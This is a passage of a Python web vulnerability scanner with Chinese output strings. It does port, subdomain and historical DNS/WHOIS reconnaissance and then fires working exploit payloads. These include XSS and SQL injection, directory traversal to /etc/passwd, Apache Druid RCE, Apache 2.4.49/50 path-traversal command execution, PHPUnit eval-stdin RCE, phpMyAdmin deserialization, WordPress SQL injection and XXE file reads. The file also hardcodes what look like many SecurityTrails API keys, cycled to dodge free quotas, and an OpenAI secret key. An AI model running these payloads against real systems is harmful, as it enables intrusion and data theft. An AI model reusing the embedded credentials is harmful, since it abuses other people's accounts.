        new_url_list = [self._url.split('/')[0] + '//' + self._url.split('/')[2] + f":{str(port)}/" for port in port_list]
        time.sleep(1)
        with tqdm(total=len(new_url_list), desc='网站端口检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(gl_threads) as pool:
                futures = [pool.submit(self._port_check, url) for url in new_url_list]
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("网站端口检测结束")

    # 运行入口
    def main(self):
        time.sleep(1)
        self._init()
        self._cms()
        self._check_subdomain_takeover()
        ips = self._ip_find()
        self._passwd_work()
        if gl_domain:
            self._domain_scan_work()
        if gl_ports:
            self._port()
        res = []
        if ips:
            tasks = len(ips) * 10
            self._ot.print_out("等待扫描端口......")
            with tqdm(total=tasks, desc="端口检测进度", bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
                with ThreadPoolExecutor(int(gl_threads)) as pool:
                    try:
                        future_tasks = [pool.submit(self._ip_port, ip, port) for ip in ips for port in range(1, 11)]
                    except Exception as e:
                        pass
                    for future in concurrent.futures.as_completed(future_tasks):
                        res.append(future.result())
                        pbar.update(1)
                wait(future_tasks)
            time.sleep(1)
            self._ot.print_out("端口信息扫描结束")
            if res:
                self._ot.print_out("端口信息通过调用socket与nmap均存在代理干扰......")
                self._ot.print_out("故端口信息存在一定技术难度，结果暂不输出......")
                self._ot.print_out("若不在意代理可全文搜索for host in res开放注释代码，关闭代理!!!")

                # for host in res:
                #     self._ot.print_out("port {host} is open")
        else:
            self._ot.print_out("IP检测结束")
            self._ot.print_out("没有找到真实IP")
        time.sleep(1)
        Api(self._url)


class Api():
    def __init__(self, url):
        self._ot = OutPrint()
        self._url = url
        self.main()

    def _domains_scan(self, domain, api_key):
        url = f"https://api.securitytrails.com/v1/domain/{domain}/subdomains?children_only=false&include_inactive=false"
        head = {"APIKEY": api_key, "accept": "application/json"}
        # print(head)
        res = requests.get(url, headers=head).json()
        domain_list = res["subdomains"]
        # print(res["subdomains"])
        return domain_list

    def _ips(self, domain, api_key):
        ips_list = []
        url = f"https://api.securitytrails.com/v1/history/{domain}/dns/a?page=1"
        headers = {
            "accept": "application/json",
            "APIKEY": api_key
        }
        # print(headers)
        response = requests.get(url, headers=headers).json()
        records = response['records']
        for i in records:
            for res in i['values']:
                if res not in ips_list:
                    ips_list.append(res['ip'] + '\t' + ''.join(i['organizations']))
                # print(res['ip'])

        return ips_list
    def _dns_history(self, domain, api_key):
        url = f"https://api.securitytrails.com/v1/history/{domain}/dns/a"
        headers = {
            "accept": "application/json",
            "APIKEY": api_key
        }
        dns_list = []
        response = requests.get(url, headers=headers).json()
        for i in response['records']:
            res = str(i).replace('{', '').replace('}', '').replace("'", "")
            dns_list.append(res)
        return dns_list
    def _whois(self, domain, api_key):
        url = f"https://api.securitytrails.com/v1/history/{domain}/whois"
        headers = {"APIKEY": api_key}
        response = requests.get(url, headers=headers).json()
        b = response['result']['items']
        res_list = []
        for i in b:
            j = i['contact']
            for h in j:
                res = str(h).replace('{', '').replace('}', '').replace("'", "")
                res_list.append(res)
        return res_list
    def _api_scan_work(self, api_key):
        try:
            new_domain = self._url.split('/')[2]
            domain_counts = new_domain.count('.')
            if domain_counts <= 2:
                res_domain = new_domain.split('.')[-2] + '.' + new_domain.split('.')[-1]
                domains = self._domains_scan(res_domain, api_key)
                dns_history = self._dns_history(res_domain, api_key)
                ips = self._ips(res_domain, api_key)
                whois = self._whois(res_domain, api_key)
                if whois:
                    with open('./result/web.txt', 'a') as w:
                        w.write('找到历史Whois信息: \n')
                    for i in whois:
                        with open('./result/web.txt', 'a') as w:
                            w.write(i + '\n')
                if ips:
                    with open('./result/web.txt', 'a') as w:
                        w.write('\n找到历史IP: \n')
                    for i in ips:
                        with open('./result/web.txt', 'a') as w:
                            w.write(i + '\n')
                if domains:
                    domain_url = [res + res_domain for res in domains]
                    with open('./result/web.txt', 'a') as w:
                        w.write('\n找到子域名: \n')
                    for i in domain_url:
                        with open('./result/web.txt', 'a') as w:
                            w.write(i + '\n')
                if dns_history:
                    with open('./result/web.txt', 'a') as w:
                        w.write('\n历史DNS: \n')
                    for i in dns_history:
                        with open('./result/web.txt', 'a') as w:
                            w.write(i + '\n')

            else:
                res_domain = new_domain.split('.')[-3] + '.' + new_domain.split('.')[-2] + '.' + new_domain.split('.')[-1]
                domains = self._domains_scan(res_domain, api_key)
                ips = self._ips(res_domain, api_key)
                dns_history = self._dns_history(res_domain, api_key)
                whois = self._whois(res_domain, api_key)
                if whois:
                    with open('./result/web.txt', 'a') as w:
                        w.write('找到历史Whois信息: \n')
                    for i in whois:
                        with open('./result/web.txt', 'a') as w:
                            w.write(i + '\n')
                if ips:
                    with open('./result/web.txt', 'a') as w:
                        w.write('\n找到历史IP: \n')
                    for i in ips:
                        with open('./result/web.txt', 'a') as w:
                            w.write(i + '\n')
                if domains:
                    domain_url = [res + res_domain for res in domains]
                    with open('./result/web.txt', 'a') as w:
                        w.write('\n找到子域名: \n')
                    for i in domain_url:
                        with open('./result/web.txt', 'a') as w:
                            w.write(i + '\n')
                if dns_history:
                    with open('./result/web.txt', 'a') as w:
                        w.write('\n历史DNS: \n')
                    for i in dns_history:
                        with open('./result/web.txt', 'a') as w:
                            w.write(i + '\n')
            self._ot.print_out(f"任务执行完成,找到{len(domains)}个子域名,找到{len(ips)}个IP.")
            return True
        except Exception as e:
            return False

    def _check(self):
        api_list = [
            "l9bT5w5eFOuqt0goLEyzopT42dZsi7Oh",
            "MOa3kQC7M4QKbV99LlxtzDY23XncaMGb",
            "pWMwa3FPu9n2p2H0SOiXTTE3un72YFNt",
            "UwIMrbGXftWvOmPNKzTEXpUIgv1dWWhx",
            "A9eM7sKx3VQVEl7bI4isOkvt52XoKQpE",
            "ZAPBYe2N4gdBhf21MkuKRzfOMbw7hSBM",
            "G6BNLfTgTB03KRQDrpsFQ0UYlaouPcND",
            "8ODAW0NYvq5B03n0Kso1e4AHJN88uwhY",
            "6D7mgYFT0Ljdqpr62RPndecl7pk9T6GF",
            "sKHtRo3cy0AjoJNcax6RglKdFISBtEXm",
            "3FdQbBrvURUbB0BwCfmkkuDN5LgcR0Px",
            "at0gwonCS5MEYR2628xYP3I7MVtWbVGL",
            "57SPa7C46yGyiz7GWYJ8VTpUElmpV4Tr",
            "oWT4xbx0nbsPCUnla3PL2ybvv65UPx2m",
            "fbHewdYUCHXGs6J4RooHuC82jqESsnwm",
            "EtD8UZriV2tK1jsjD7DPCMZ6y3o3OkDx",
            "txDVGVXMYHZ8SJ3mdQfxgoKkKSCc1sv7",
            "C4heZ2fSYVaTEYpMFXyqRkTXg4HxuB7e",
            "H7CZcXMmjHVdHmx8z4JqibqfyR0T4qoE",
            "zti45cSnlGUfBIG4xY9iEBsuFeOTbltg",
            "wC3wC7Qv4A18ThMHofBwotTfP11V6PdW",
            "PPJthbAeKE1PRj6xlfPT3p1um3eZcTQm",
            "aqNCme3oRDT9rQGANorRrhL11mBuat75",
            "txDVGVXMYHZ8SJ3mdQfxgoKkKSCc1sv7",
            "YWU4DXe1vC0Kuq8smxOGo1GiCMv5d76W",
            "eCrmg35IIi00F5FU6bnDiKVLFGueCnNn",
            "pdGy0m37iKnZKjSOaQzBaA3kIUC7k04q",
            "NMsmHIcCJObuSL118ZuUM7IKLCsviVq9",
            "J7LkDFSHlP7s2Og8yL732znNkVO6e2s8",
            "P8fwv5gxlDNdxnyS0bJYRKXWFbsUNoWd",
            "tHLTyQGRTYyd7nJhEWQL2ZAeY0hD2Ucl",

        ]
        flag = False
        res = self._api_scan_work(api_list[0])
        if res:
            flag = True
        else:
            num = 1
            for i in api_list[1:]:
                res_twice = self._api_scan_work(i)
                if res_twice:
                    flag = True
                    break
                else:
                    self._ot.print_out(f"目前有{num}个接口免费数量已经全部使用，剩余{len(api_list) - num}个接口待测")
                    num += 1
                    if num == len(api_list):
                        flag = False
        if flag:
            return True
        else:
            return False

    def main(self):
        domain = self._url.split('/')[2]
        pattern = r'[a-zA-Z]'
        data_check = bool(re.search(pattern, domain))
        if data_check:
            self._ot.print_out("开始通过接口查找子域名......")
            res = self._check()
            if res:
                self._ot.print_out("接口信息查询结束")
            else:
                self._ot.print_out("[*WARING*] 接口免费查询数量已经全部使用")
        else:
            self._ot.print_out("[*WARING*] 目标不具备子域名搜索条件")


class OpenAi():
    def __init__(self):
        self._work()

    def _work(self):
        openai.api_key = "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"
        while True:
            now = datetime.datetime.now()
            now_time = now.strftime("%H:%M:%S")
            datas = str(input(f"└─{now_time}──$:\n"))
            if datas == "exit":
                break
            else:
                try:
                    completion = openai.ChatCompletion.create(
                        model="gpt-3.5-turbo",
                        messages=[
                            {"role": "user", "content": datas}
                        ]
                    )
                    message = json.dumps(completion.choices[0].message, indent=4, ensure_ascii=False)
                    content = json.loads(message)['content']
                    line_list = content.split('。')
                    print(f"└─{now_time}──AI:")
                    for lines in line_list:
                        print(lines)
                    # max_width = 60
                    # content = '\n'.join(content[i:i + max_width] for i in range(0, len(content), max_width))
                except Exception as e:
                    print(f"[{now_time}] [*WARNING*] 进入聊天功能失败:(")


# 漏洞存放类
class Pocs:
    def __init__(self):
        self._ot = OutPrint()
        self._ua = UserAgent()

    def _xss(self, payload_url, payload):
        try:
            response = requests.get(url=payload_url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and payload in response.text:
                with open('result/xss.txt', 'a') as w:
                    w.write(payload_url + '\n')
        except Exception as e:
            pass

    def _xss_work(self, link_list, threads):
        self._ot.print_out("开始XSS检测......")
        new_url_list = []
        with open('./set/xss_payload.txt', 'r', encoding="utf-8") as payload_txt:
            payload_txt.seek(0)
            payload_lines = payload_txt.readlines()
            for url in link_list:
                counts = url.count('=')
                for payload in payload_lines:
                    for num in range(1, counts + 1):
                        xss_url = url.replace(url.split('=')[num].split('&' or '/')[0], payload.strip())
                        new_url_list.append(xss_url)
            time.sleep(1)
            with tqdm(total=(len(new_url_list)), desc='Xss检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
                with ThreadPoolExecutor(threads) as pool:
                    try:
                        futures = [pool.submit(self._xss, xss_url, payload.strip()) for xss_url in new_url_list]
                    except Exception as e:
                        pass

                    for future in concurrent.futures.as_completed(futures):
                        future.result()
                        pbar.update(1)
                wait(futures)
            time.sleep(1)
            self._ot.print_out("xss检测结束")

    def _sql(self, url, choose):
        if choose == "time":
            try:
                time_start = time.time()
                response = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=12, proxies=gl_proxy)
                time_end = time.time()
                res_time = time_end - time_start
                if response.status_code == 200 and res_time > 10:
                    with open('./result/sql.txt', 'a') as w:
                        w.write(url + '\n')
            except Exception as e:
                pass
        elif choose == "headers":
            sql_headers = {
                "User_Agent": "id=1' and 1=2-- a",
                "Referer": "id=1' and 1=2-- a"
            }
            sql_cookies = {"Cookies": f"{gl_cookie}id=1' and 1=2-- a"}
            try:
                response_one = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
                response_one_content = response_one.content
                if response_one.status_code == 200:
                    try:
                        response_two = requests.get(url=url, headers=sql_headers, cookies=sql_cookies, verify=gl_verify, timeout=2, proxies=gl_proxy)
                        if response_two.status_code == 200 and len(response_two.content) != len(response_one_content):
                            with open('./result/sql.txt', 'a') as w:
                                w.write('头部注入:' + url + '\n')
                    except Exception as e:
                        pass
            except Exception as e:
                pass
        elif choose == "get":
            pocs = ['"', "'"]
            counts = url.count('=')
            response_url = [url.replace(url.split('=')[num].split('&' or '/')[0], '211' + poc) for num in range(1, counts + 1) for poc in pocs]
            try:
                response_one = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
                if response_one.status_code == 200:
                    response_one_content = response_one.content
                    for sql_url in response_url:
                        try:
                            response_two = requests.get(url=sql_url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
                            response_two_content = response_two.content
                            if response_two.status_code == 200 and len(response_one_content) != len(response_two_content):
                                with open('./result/sql.txt', 'a') as w:
                                    w.write(sql_url + '\n')
                        except Exception as e:
                            pass
            except Exception as e:
                pass

    def _sql_time(self, links_lines, threads):
        # sql time
        self._ot.print_out("开始Sql-Time检测......")
        sql_url_list = []
        with open('set/sql_time.txt', 'r', encoding='utf-8') as payload_txt:
            payload_txt.seek(0)
            payload_lines = payload_txt.readlines()
            for url in links_lines:
                counts = url.count('=')
                for payload in payload_lines:
                    for num in range(1, counts + 1):
                        sql_url = url.replace(url.split('=')[num].split('&' or '/')[0], payload.strip())
                        sql_url_list.append(sql_url)
        time.sleep(1)
        with tqdm(total=len(sql_url_list), desc='Sql-Time检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._sql, url, "time") for url in sql_url_list]
                except Exception as e:
                    pass

                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("sql-time检测结束")

    def _sql_get(self, link_list, threads):
        self._ot.print_out("开始Sql-Get检测......")
        #  sql get
        time.sleep(1)
        with tqdm(total=len(link_list), desc='Sql-Get检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._sql, url, "get") for url in link_list]
                except Exception as e:
                    pass

                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("sql-get检测结束")

    def _sql_header(self, link_list, threads):
        self._ot.print_out("开始Sql-Header检测......")
        time.sleep(1)
        with tqdm(total=len(link_list), desc='Sql-Header检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._sql, url, "headers") for url in link_list]
                except Exception as e:
                    pass

                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("sql-headers检测结束")

    def _sql_work(self, link_list, links_lines, threads):
        self._sql_time(links_lines, threads)
        time.sleep(2)
        self._sql_get(link_list, threads)
        time.sleep(2)
        self._sql_header(link_list, threads)

    def _apache_druid(self, url):
        self._ot.print_out("开始检测Apache-Druid-Rce漏洞......")
        new_url = url + "/druid/indexer/v1/sampler"
        data = '{"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\\"isRobot\\":true,\\"channel\\":\\"#x\\",\\"timestamp\\":\\"2021-2-1T14:12:24.050Z\\",\\"flags\\":\\"x\\",\\"isUnpatrolled\\":false,\\"page\\":\\"1\\",\\"diffUrl\\":\\"https://xxx.com\\",\\"added\\":1,\\"comment\\":\\"Botskapande Indonesien omdirigering\\",\\"commentLength\\":35,\\"isNew\\":true,\\"isMinor\\":false,\\"delta\\":31,\\"isAnonymous\\":true,\\"user\\":\\"Lsjbot\\",\\"deltaBucket\\":0,\\"deleted\\":0,\\"namespace\\":\\"Main\\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec(\'ping -h\')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}'
        headers = {
            "Host": url.split('/')[2],
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0",
            "Origin": url,
            "Referer": url + "/unified-console.html"
        }
        try:
            response = requests.post(url=new_url, headers=headers, proxies=gl_proxy, data=data, timeout=5, verify=gl_verify)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and "ping" in response.text:
                with open('./result/apache.txt', 'a') as w:
                    w.write("存在druid-rce:" + new_url + "请求data:" + data + "\n")
        except Exception as e:
            pass
        self._ot.print_out("Apache-Druid-Rce检测结束")

    def _log4j(self):
        pass

    def _dir(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if "root:" in response.text:
                with open('./result/dir.txt', 'a') as w:
                    w.write("存在目录穿越" + url + '\n')
        except Exception as e:
            pass

    def _dir_work(self, demo_url, link_list, threads):
        self._ot.print_out("开始检测目录穿越......")
        time.sleep(2)
        new_url_list = []
        for url in link_list:
            counts = url.count('=')
            for num in range(1, counts + 1):
                mb_url = url.replace(url.split('=')[num].split('&' or '/')[0], "/../../../../../../../../etc/passwd")
                if "http" in mb_url:
                    new_url_list.append(mb_url)
        if new_url_list:
            time.sleep(1)
            with tqdm(total=len(new_url_list), desc='目录穿越检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
                with ThreadPoolExecutor(threads) as pool:
                    try:
                        futures = [pool.submit(self._dir, url) for url in new_url_list]
                    except Exception as e:
                        pass
                    for future in concurrent.futures.as_completed(futures):
                        future.result()
                        pbar.update(1)
                wait(futures)
            time.sleep(1)
        self._ot.print_out("目录穿越检测结束")

    def _web_info(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and "error" not in response.text and "404" not in response.text and "not found" not in response.text:
                with open('./result/dir.txt', 'a') as w:
                    w.write("存在敏感文件" + url + '\n')
        except Exception as e:
            pass

    def _web_info_work(self, url, threads):
        self._ot.print_out("开始检测铭感文件......")
        new_url_list = []
        poc_list = [
            "etc/passwd",
            "home/httpd/www/",
            "home/httpd/",
            "usr/local/services/apache-tomcat-8.0.23/logs",
            "etc/nginx/nginx.conf",
            "usr/local/services/jetty-8.1.16/",
            "proc/self/cmdline",
            "C:\Windows\my.ini",
            "root/.ssh/authorized_keys"
        ]
        for poc in poc_list:
            new_url_list.append(url + f"/../../../../../../../../{poc}")
        time.sleep(1)
        with tqdm(total=len(new_url_list), desc='测铭感文件检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._web_info, url) for url in new_url_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("铭感文件检测结束")

    def _pma(self, demo_url):
        poc_list = [
            ':888/pma',
            '/pma',
            ':8080/pma',
        ]
        for i in poc_list:
            url = demo_url + i
            try:
                response = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
                response.encoding = response.apparent_encoding
                if response.status_code == 200 and "admin" in response.text:
                    with open('./result/pma.txt', 'a') as w:
                        w.write(url + '\n')
            except Exception as e:
                pass

    def _pma_setup(self, demo_url):
        poc_url = [
            f"{demo_url}/scripts/setup.php",
            f"{demo_url}:8080/scripts/setup.php",
            f"{demo_url}:888/scripts/setup.php",
        ]
        headers = {
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Accept-Language": "en",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        payload = "action=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\";s:11:\"/etc/passwd\";}"
        for url in poc_url:
            try:
                response = requests.post(url, headers=headers, data=payload, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
                response.encoding = response.apparent_encoding
                if "root:" in response.text:
                    with open('./result/pma.txt', 'a') as w:
                        w.write("存在phpmyadmin反序列化漏洞:" + url + '\n')
            except Exception as e:
                pass

    def _pma_work(self, url, threads):
        self._ot.print_out("开始检测PhpMyadmin漏洞......")
        work_list = [
            self._pma,
            self._pma_setup
        ]
        time.sleep(1)
        with tqdm(total=len(work_list), desc='PhpMyadmin漏洞检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(work, url) for work in work_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("PhpMyadmin漏洞检测结束")

    def _thinkphp(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if "disable_function" in response.text:
                with open('./result/tprce.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _thinkphp_work(self, demo_url, threads):
        self._ot.print_out("开始检测ThinkPhp-Rce......")
        tp_url_list = []
        with open('./set/thinkphp_payload.txt', 'r', encoding="utf-8") as tp:
            tp.seek(0)
            payload_lines = tp.readlines()
            for payload in payload_lines:
                tp_url = demo_url + payload.strip()
                tp_url_list.append(tp_url)
        time.sleep(1)
        with tqdm(total=len(tp_url_list), desc='Tp-rce检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._thinkphp, tp_url) for tp_url in tp_url_list]
                except Exception as e:
                    pass
                # wait(futures)
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("tp-rce检测结束")

    def _wordpress(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and ('name' in response.text or 'author' in response.text):
                with open('./result/wp_user.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _wp_feed(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and 'error' not in response.text and '404' not in response.text:
                with open('./result/wp_user.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _wp_feed_work(self, url, threads):
        self._ot.print_out('开始检测Wordpress信息......')
        poc_list = [
            '/retro/index.php/comments/feed/',
            '/wp-content/uploads/',
            '/wp-content/debug.log',
            '/feed',
            '/?feed=rss2',
            '/wp-content/plugins/PLUGINNAME/readme.TXT',
            '/wp-content/plugins/PLUGINNAME/readme.txt',
            '/wp-content/themes/THEMENAME/style.css ',
            '/wp-content/themes/THEMENAME/readme.txt',
            '/.wp-config.php.swp',
            '/wp-config.inc',
            '/wp-config.old',
            '/wp-config.txt',
            '/wp-config.html',
            '/wp-config.php.bak',
            '/wp-config.php.dist',
            '/wp-config.php.inc',
            '/wp-config.php.old',
            '/wp-config.php.save',
            '/wp-config.php.swp',
            '/wp-config.php.txt',
            '/wp-config.php.zip',
            '/wp-config.php.html',
            '/wp-config.php',
            '/wp-includes/',
            '/xmlrpc.php',
            '/wp-config.php~',
            '/wp-login.php?action=register',

        ]
        with tqdm(total=len(poc_list), desc='Wordpress信息检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._wp_feed, url + poc) for poc in poc_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Wordpress信息检测结束")

    def _wp_sql(self, url):
        self._ot.print_out('开始检测Wordpress-sql注入......')
        new_url = url + '/wp-admin/admin-ajax.php'
        data = {
            'action=aa&query_vars[tax_query][1][include_children]=1&query_vars[tax_query][1][terms][1]=1) or updatexml(0x7e,concat(1,user()),0x7e)#&query_vars[tax_query][1][field]=term_taxonomy_id',
        }
        try:
            response = requests.post(url=new_url, headers=gl_headers, data=data, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if 'XPATH' in response.text:
                with open('./result/wp_user.txt', 'a') as w:
                    w.write('存在sql注入:' + url + '\n')
        except Exception as e:
            pass
        self._ot.print_out("Wordpress-sql检测结束")

    def _wordpress_work(self, url, threads):
        self._ot.print_out("开始检测是否泄漏Wordpress-User......")
        wp_url_list = []
        with open('./set/wp_user.txt', 'r', encoding="utf-8") as payloads_txt:
            payloads_txt.seek(0)
            payloads_lines = payloads_txt.readlines()
            for payload in payloads_lines:
                wp_url = url + payload.strip()
                wp_url_list.append(wp_url)
        time.sleep(1)
        with tqdm(total=len(wp_url_list), desc='Wp-User检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._wordpress, wp_url) for wp_url in wp_url_list]
                except Exception as e:
                    pass
                # wait(futures)
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("wordpress-user检测结束")

    def _unauthorized(self, url):
        try:
            response = requests.post(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
            if response.status_code == 200:
                with open('./result/wsq.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _unauthorized_work(self, threads):
        pass

    def _apache_http(self, url):
        s = requests.Session()
        try:
            session = requests.Session()
            command = "echo; id"
            req = requests.Request('POST', url=url, data=command, params=gl_proxy)
            prepare = req.prepare()
            prepare.url = url
            response = session.send(prepare, timeout=5)
            output = response.text
            if "uid" in output or "root" in output:
                with open('./result/apche.txt', 'a') as w:
                    w.write('存在apache-http系列漏洞' + url + '\n')
        except Exception as e:
            pass

    def _apache_http_work(self, url, threads):
        self._ot.print_out("开始检测Apache 2.4.49-2.4.50 RCE......")
        apache2449_payload = url + '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
        apache2450_payload = url + '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash'
        apache2451_payload = url + '/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd'
        apache2452_payload = url + '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
        payloads = [apache2449_payload, apache2450_payload, apache2451_payload, apache2452_payload]
        time.sleep(1)
        with tqdm(total=len(payloads), desc='Apache检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._apache_http, url) for url in payloads]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Apache检测结束")

    def _php_unit(self, site):
        try:
            req = requests.get(site, headers={
                "Content-Type": "text/html",
                "User-Agent": f"Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
            }, data="<?php echo md5(phpunit_rce); ?>", proxies=gl_proxy, verify=gl_verify)
            if "6dd70f16549456495373a337e6708865" in req.text:
                with open('./result/php.txt', 'a') as w:
                    w.write('存在php-unin漏洞' + site + '\n')
        except Exception as e:
            pass

    def _php_work(self, url, threads):
        self._ot.print_out("开始检测PHP-Unin漏洞......")
        phpfiles = [
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        ]
        site = url
        if site.endswith("/"):
            site = list(site)
            site[len(site) - 1] = ''
            site = ''.join(site)
        time.sleep(1)
        with tqdm(total=len(phpfiles), desc='PHP-Unin检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    pathvulns = [pool.submit(self._php_unit, site + i) for i in phpfiles]
                except Exception as e:
                    pass
                for pathvuln in concurrent.futures.as_completed(pathvulns):
                    pathvuln.result()
                    pbar.update(1)
            wait(pathvulns)
        time.sleep(1)
        self._ot.print_out("PHP-Unin检测结束")

    def _xxe(self, url):
        self._ot.print_out("开始检测xxe漏洞......")
        try:
            # 发送正常请求
            start_time = time.time()
            requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, proxies=gl_proxy)
            end_time = time.time()
            normal_time = end_time - start_time

            # 发送恶意请求
            xml = """
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>
            """
            xxe_header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0", "Content-Type": "text/xml"}
            start_time = time.time()
            response = requests.post(url=url, headers=xxe_header, data=xml, cookies=gl_cookie, verify=gl_verify, proxies=gl_proxy)
            end_time = time.time()
            xxe_time = end_time - start_time

